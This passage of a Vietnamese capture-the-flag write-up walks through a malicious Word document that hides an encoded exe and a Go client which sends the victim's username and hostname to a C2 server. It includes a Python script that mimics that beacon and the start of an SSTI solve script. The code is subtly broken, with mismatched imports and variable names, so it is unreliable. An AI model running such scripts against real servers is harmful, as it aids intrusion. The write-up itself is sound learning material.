+	srcset=&#34;/p/cookie-arena-2-reverse-engineering/image20_hu7303a1b64d043676e06fd7148e64c9c3_11342_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image20_hu7303a1b64d043676e06fd7148e64c9c3_11342_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;flag&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;121&#34;
+		data-flex-basis=&#34;290px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;cv-malware&#34;&gt;CV Malware&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Thời gian gần đây có nhiều hình thức xâm nhập vào máy tính nạn nhân thông qua mã độc được gắn trong file Word. Khi mã độc thực thi, chúng sẽ lấy thông tin của nạn nhân để gửi về máy chủ điều khiển C&amp;amp;C. Liệu hacker cũng có thể thể bị hack, hãy cùng đi săn kẻ xấu nhé!&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Mang tiếng Malware nhưng là bài duy nhất rev tải về không bị Windows tự động phát hiện và xoá :))&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/p/cookie-arena-2-reverse-engineering/image22.png&#34;
+	width=&#34;258&#34;
+	height=&#34;302&#34;
+	srcset=&#34;/p/cookie-arena-2-reverse-engineering/image22_hu14024a727f2bf402fa2647273e93007c_6556_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image22_hu14024a727f2bf402fa2647273e93007c_6556_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;File Word của challenge&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;85&#34;
+		data-flex-basis=&#34;205px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;phân-tích-file-2&#34;&gt;Phân tích file&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&#34;/p/cookie-arena-2-reverse-engineering/image23-1.png&#34;
+	width=&#34;494&#34;
+	height=&#34;87&#34;
+	srcset=&#34;/p/cookie-arena-2-reverse-engineering/image23-1_hu3a84b2b9d6e22919e512d630ef2137f4_13657_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image23-1_hu3a84b2b9d6e22919e512d630ef2137f4_13657_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;567&#34;
+		data-flex-basis=&#34;1362px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Dựa vào kiểm tra header của file thì linux cho rằng đây là 1 file Word (nhưng thực chất Word được cấu tạo như 1 file Zip)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/p/cookie-arena-2-reverse-engineering/image-9.png&#34;
+	width=&#34;1209&#34;
+	height=&#34;378&#34;
+	srcset=&#34;/p/cookie-arena-2-reverse-engineering/image-9_hu0505b02042220cc736da79f91fb49215_485453_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-9_hu0505b02042220cc736da79f91fb49215_485453_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;319&#34;
+		data-flex-basis=&#34;767px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;unzip--check&#34;&gt;Unzip &amp;amp; check&lt;/h3&gt;
+&lt;p&gt;Từ đây mình tiến hành giải nén &amp;ldquo;file zip&amp;rdquo; này ra và kiểm tra xem nó có gì lạ hay không (Chú ý đến các file xml xuất hiện trong bản giải nén này)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/p/cookie-arena-2-reverse-engineering/image-10.png&#34;
+	width=&#34;1217&#34;
+	height=&#34;499&#34;
+	srcset=&#34;/p/cookie-arena-2-reverse-engineering/image-10_hu6bfe9cf64fe86a1f6bdb52383490fabf_392289_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-10_hu6bfe9cf64fe86a1f6bdb52383490fabf_392289_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;243&#34;
+		data-flex-basis=&#34;585px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/p/cookie-arena-2-reverse-engineering/image-12.png&#34;
+	width=&#34;1708&#34;
+	height=&#34;663&#34;
+	srcset=&#34;/p/cookie-arena-2-reverse-engineering/image-12_huecca0abbe4fc9ffc679cad313214557d_620070_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-12_huecca0abbe4fc9ffc679cad313214557d_620070_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;257&#34;
+		data-flex-basis=&#34;618px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Qua việc nhìn bằng mắt thường thì cũng thấy rằng đoạn XML này thực ra được mã hóa từ hexa và base64, mình sẽ tiến hành decode nó&lt;/p&gt;
+&lt;h3 id=&#34;decode&#34;&gt;Decode&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&#34;/p/cookie-arena-2-reverse-engineering/image-13.png&#34;
+	width=&#34;654&#34;
+	height=&#34;525&#34;
+	srcset=&#34;/p/cookie-arena-2-reverse-engineering/image-13_hu75ebdd7bceeaa0207ac58a1c30fa23d5_96247_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-13_hu75ebdd7bceeaa0207ac58a1c30fa23d5_96247_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Decode hexa&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;124&#34;
+		data-flex-basis=&#34;298px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;server:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   host: http://REPLACE_HOST_HERE
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   secret: SecR3TtOKen
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Nhìn qua thì đây là giống như 1 chỉ dẫn về host và mật khẩu của server để file này tương tác với nó thì phải&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/p/cookie-arena-2-reverse-engineering/image-14.png&#34;
+	width=&#34;1024&#34;
+	height=&#34;713&#34;
+	srcset=&#34;/p/cookie-arena-2-reverse-engineering/image-14_hu9bfcc4d842cdb72a1f4fe858c1ef5384_440996_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-14_hu9bfcc4d842cdb72a1f4fe858c1ef5384_440996_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Decode Base64&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;143&#34;
+		data-flex-basis=&#34;344px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Dựa vào header &lt;code&gt;MZ&lt;/code&gt; của đoạn base64 được decode kia thì có thể đoán được đây là 1 file &lt;code&gt;exe&lt;/code&gt; trên Windows, export về và load vào IDA để kiểm tra xem nó có gì nào&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;main&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;/p/cookie-arena-2-reverse-engineering/image-4.png&#34;
+	width=&#34;759&#34;
+	height=&#34;300&#34;
+	srcset=&#34;/p/cookie-arena-2-reverse-engineering/image-4_huaa842713bee10d83a4801aed15ba7220_93907_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-4_huaa842713bee10d83a4801aed15ba7220_93907_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Hàm main&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;253&#34;
+		data-flex-basis=&#34;607px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Nhìn kỹ 1 chút thì ở đây có hàm &lt;code&gt;downloadFile&lt;/code&gt; với tham số là &lt;code&gt;REPLACE_HOST_HERE&lt;/code&gt;, kiểm tra trực tiếp nó thì thấy được đoạn phương thức GET client.exe từ &lt;code&gt;/static&lt;/code&gt; về&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/p/cookie-arena-2-reverse-engineering/image-15.png&#34;
+	width=&#34;918&#34;
+	height=&#34;462&#34;
+	srcset=&#34;/p/cookie-arena-2-reverse-engineering/image-15_hu8e0d8c58e0fd1dcd05a4cbd8de2da655_112092_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-15_hu8e0d8c58e0fd1dcd05a4cbd8de2da655_112092_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;198&#34;
+		data-flex-basis=&#34;476px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Với host mặc định của challenge thì chắc chắn sẽ lấy file từ &lt;code&gt;http://103.97.125.53:31040/static/client.exe​&lt;/code&gt; truy cập vào đó và lấy file về, có thể đây là phương thức giao tiếp giữa người bị hại và server.&lt;/p&gt;
+&lt;h3 id=&#34;clientexe&#34;&gt;client.exe&lt;/h3&gt;
+&lt;p&gt;Đây là 1 file được viết bởi Golang, dạo gần đây mình thấy các challenge kiểu tương tác giữa client và server được dùng rất nhiều&lt;/p&gt;
+&lt;p&gt;Load file vào IDA&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/p/cookie-arena-2-reverse-engineering/image-16.png&#34;
+	width=&#34;963&#34;
+	height=&#34;543&#34;
+	srcset=&#34;/p/cookie-arena-2-reverse-engineering/image-16_hud77379b8af9506a4348133a73bc4742b_149276_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-16_hud77379b8af9506a4348133a73bc4742b_149276_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;177&#34;
+		data-flex-basis=&#34;425px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Dựa vào cách đặt tên thì có thể đoán được:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;main_getSystemInfo()&lt;/code&gt; là hàm lấy các thông tin của máy nạn nhân&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;main_sendPostRequest()&lt;/code&gt; là hàm gửi đi các thông tin lấy được (client.exe sẽ tương tác với host)&lt;/li&gt;
+&lt;li&gt;Còn về hàm &lt;code&gt;main_loadAllConfigs()&lt;/code&gt; thì mình chưa hình dung ra được nó sẽ làm gì, có thể là liên quan đến việc config nào đó cho phía server hiểu được và lúc này thì có thể để ý đến đoạn chỉ dẫn về &lt;code&gt;host&lt;/code&gt; và &lt;code&gt;secret&lt;/code&gt; ban nãy&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ul&gt;
+&lt;li&gt;main_loadAllConfigs():&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;/p/cookie-arena-2-reverse-engineering/image-17.png&#34;
+	width=&#34;817&#34;
+	height=&#34;749&#34;
+	srcset=&#34;/p/cookie-arena-2-reverse-engineering/image-17_huee2c6afbfb1db61f6abeb3a2793fadae_391190_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-17_huee2c6afbfb1db61f6abeb3a2793fadae_391190_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;109&#34;
+		data-flex-basis=&#34;261px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Khi để file config cùng trong thư mục với client.exe thì có thấy lỗi về ini &amp;ndash;&amp;gt; đổi thành &lt;code&gt;config.ini&lt;/code&gt; và chuyển &lt;code&gt;host: http://103.97.125.53:31040&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;bắt-tương-tác-giữa-client-với-host-thông-qua-wireshark&#34;&gt;Bắt tương tác giữa client với host thông qua Wireshark&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&#34;/p/cookie-arena-2-reverse-engineering/image-18.png&#34;
+	width=&#34;664&#34;
+	height=&#34;83&#34;
+	srcset=&#34;/p/cookie-arena-2-reverse-engineering/image-18_hu948b07a42b76b9862b5d3e35f5fa4db7_34176_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-18_hu948b07a42b76b9862b5d3e35f5fa4db7_34176_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;800&#34;
+		data-flex-basis=&#34;1920px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/p/cookie-arena-2-reverse-engineering/image-19.png&#34;
+	width=&#34;916&#34;
+	height=&#34;437&#34;
+	srcset=&#34;/p/cookie-arena-2-reverse-engineering/image-19_hu89ab33875556a08176677ec81e0be0cd_222425_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-19_hu89ab33875556a08176677ec81e0be0cd_222425_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;209&#34;
+		data-flex-basis=&#34;503px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Từ đây có thể thấy client gửi các thông tin về &lt;code&gt;username&lt;/code&gt;, &lt;code&gt;hostname&lt;/code&gt; từ phía client đồng thời cùng với &lt;code&gt;secret: SecR3TtOken&lt;/code&gt; lên server và được trả về &lt;code&gt;Logged username hostname&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Từ đây có thể viết 1 đoạn script mô phỏng việc gửi thông tin và nhận thông tin giữa client và server như sau:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;request&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://103.97.125.53:31040&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;header&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;User-Agent&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Go-http-server/1.1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;Accept&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.7&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;Accept-Encoding&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;gzip&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;Content-Type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;application/json&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;Secret&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;SecR3Ttoken&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;SPID3R-MSI\Spid3r&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;hostname&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Spider-msi&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Logged SPID3R-MSI\Spid3r Spid3r-msi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Vậy thì đã giải quyết xong việc kết nối &amp;ldquo;nhân tạo&amp;rdquo; giữa client và server thông qua đoạn script trên&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;dựa vào hint mà nếu không đưa ra thì không ai biết mà giải nổi đến từ tác giả &lt;code&gt;FLAG nằm trên host, tìm cách kết nối đúng và exploit&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;thì bây giờ việc quan trọng nhất sẽ là đi tìm lỗi trên server để dựa vào việc khai thác nó và lấy flag&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/p/cookie-arena-2-reverse-engineering/image-20.png&#34;
+	width=&#34;846&#34;
+	height=&#34;649&#34;
+	srcset=&#34;/p/cookie-arena-2-reverse-engineering/image-20_hu6e34c88260aeecc1f4fd81e30015f6dd_402296_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-20_hu6e34c88260aeecc1f4fd81e30015f6dd_402296_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;130&#34;
+		data-flex-basis=&#34;312px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;May thật, thử phát đầu thì dính đét lỗi SSTI luôn, việc cuối cùng chỉ là viết payload để get flag trực tiếp từ server thôi&lt;/p&gt;
+&lt;p&gt;Script giải:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;request&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://103.97.125.53:31040&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;header&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;User-Agent&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Go-http-server/1.1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;Accept&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.7&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
